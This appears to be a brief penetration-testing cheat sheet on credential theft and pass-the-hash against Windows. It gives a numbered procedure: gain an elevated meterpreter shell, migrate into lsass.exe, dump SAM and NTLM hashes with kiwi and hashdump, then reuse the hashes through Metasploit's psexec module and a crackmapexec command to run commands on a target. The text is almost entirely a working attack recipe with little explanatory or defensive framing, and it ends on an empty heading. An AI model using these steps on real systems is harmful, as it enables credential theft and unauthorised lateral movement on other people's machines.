
harvesting ntlm hashes and using them to authenticate with target via SMB

Methodology
=
1. get meterpreter shell with escelated priviledges
2. migrate to lsass.exe process `pgrep lsass`
3. `load kiwi`
4. `lsa_dump_sam` - make file with username: hash
5. `hashdump` - get LM hashes (format: username:sid:LMhash:NTLMhash:::)
6. use metasploit `exploit/windows/smb/psexec`
	1. set user
	2. set pass as with LM:NTLM hash
	3. may need to set/configure target, try different targets `set target `
7. run

crackmapexec
=
`crackmapexec smb target -u username -H NTLM_HASH_ALONE`
	-x "commands" - look past errors, go back to the top

PsExec (MSF)
=